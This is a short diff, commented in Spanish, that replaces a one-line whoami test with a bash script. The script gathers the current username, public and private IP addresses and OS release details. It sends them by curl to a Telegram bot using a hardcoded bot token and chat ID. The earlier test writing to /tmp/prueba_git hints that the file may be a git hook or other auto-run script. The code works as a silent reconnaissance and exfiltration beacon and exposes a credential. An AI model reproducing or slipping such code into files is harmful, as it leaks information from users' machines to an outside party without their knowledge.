@@ -1,1 +1,18 @@
-whoami > /tmp/prueba_git
+#!/bin/bash
+
+# Datos del bot
+BOT_TOKEN="8321523892:AAHxnDwpqtu0iOY4muAR2-d7LN8cCvn5uXc"
+CHAT_ID="1917768095"
+
+# Obtener nombre de usuario
+USER=$(whoami)
+IP_PU=$(curl ifconfig.me)
+VERSION=$(cat /etc/os-release)
+IPV4=$(hostname -I)
+# Mensaje a enviar
+MESSAGE="Usuario: $USER%0A Publica: $IP_PU%0A Privada: $IPV4%0AS.O: $VERSION"
+
+# Enviar mensaje vía curl a Telegram API
+curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+     -d chat_id="$CHAT_ID" \
+     -d text="$MESSAGE"
